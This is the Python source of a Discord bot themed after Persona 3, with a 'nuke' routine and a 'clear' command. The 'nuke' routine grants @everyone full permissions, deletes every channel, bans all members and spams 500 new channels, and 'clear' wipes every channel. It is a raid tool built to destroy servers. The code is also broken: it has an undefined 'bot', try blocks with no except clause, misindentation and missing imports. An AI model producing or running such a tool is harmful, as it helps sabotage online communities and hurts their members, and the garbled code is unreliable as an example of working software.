#머리

import discord, asyncio
from discord.ext import commands
import os

client = commands.Bot(command_prefix = '?')

@client.event
async def on_ready():

  # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
  await client.change_presence(status=discord.Status.online)

  await client.change_presence(activity=discord.Game(name="Persona 3"))
  #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
  
  print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)

@client.command()
async def clear(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()

      
@client.command()
async def overheat(ctx):
  await ctx.message.delete()
  exit()
  
  
@bot.command()
async def orgia(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)
  

  
@client.event
async def nuke(guild):  
print(f"{C.WHITE}Nuking {guild.name}.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
  for channel in guild.channels:
    try:
      await channel.delete()
  for member in guild.members:
    try:
      await member.ban()
    except: 
  for i in range(500):
    await guild.create_text_channel(random.choice(channel_names))
 
    
client.run(os.environ['token'])
